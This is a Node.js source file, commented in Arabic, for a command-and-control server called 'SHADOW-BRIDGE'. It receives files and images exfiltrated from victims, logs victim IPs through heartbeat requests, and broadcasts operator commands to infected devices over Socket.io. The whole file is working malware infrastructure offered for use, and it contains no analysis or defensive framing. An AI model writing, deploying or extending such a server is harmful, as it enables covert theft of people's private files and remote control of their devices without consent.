const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);

// إعداد Socket.io للعمل مع لوحة التحكم
const io = new Server(server, {
    cors: { origin: "*" }
});

// إنشاء مجلد التخزين للصور والملفات المسحوبة
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

app.use(express.static('uploads'));
app.use(express.json({ limit: '50mb' }));

// مصفوفة لتخزين الضحايا المتصلين
let targets = {};

// 1. استقبال البيانات المسحوبة (صور/ملفات)
app.post('/exfiltrate', (req, res) => {
    const { id, type, data, fileName } = req.body;
    
    if (type === 'IMAGE' || type === 'FILE') {
        const filePath = path.join(uploadDir, fileName);
        // تحويل البيانات من Base64 إلى ملف حقيقي
        fs.writeFileSync(filePath, data, 'base64');
        
        // إرسال تنبيه للوحة التحكم لعرض الصورة
        io.emit('data_result', { 
            from: id, 
            msg: `تم سحب ملف جديد: ${fileName}`,
            fileUrl: `${req.protocol}://${req.get('host')}/${fileName}`,
            fileType: type
        });
    }
    res.sendStatus(200);
});

// 2. استقبال نبضات الضحايا (Uplink)
app.get('/uplink', (req, res) => {
    const targetId = req.query.u || `ID-${Math.floor(Math.random()*1000)}`;
    targets[targetId] = { id: targetId, ip: req.ip, lastSeen: Date.now() };
    
    // إبلاغ لوحة التحكم بظهور ضحية جديدة
    io.emit('target_online', targets[targetId]);
    res.send("PULSE_ACK");
});

// 3. إدارة الأوامر من لوحة التحكم
io.on('connection', (socket) => {
    console.log('[+] Control Panel Connected');

    socket.on('command', (cmd) => {
        console.log(`[!] Sending Command: ${cmd.action} to ${cmd.to}`);
        // بث الأمر للضحية
        io.emit('execute_cmd', cmd); 
    });
});

// ملاحظة: Railway يحدد المنفذ تلقائياً عبر process.env.PORT
const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`💀 SHADOW-BRIDGE RUNNING ON PORT ${PORT}`);
});
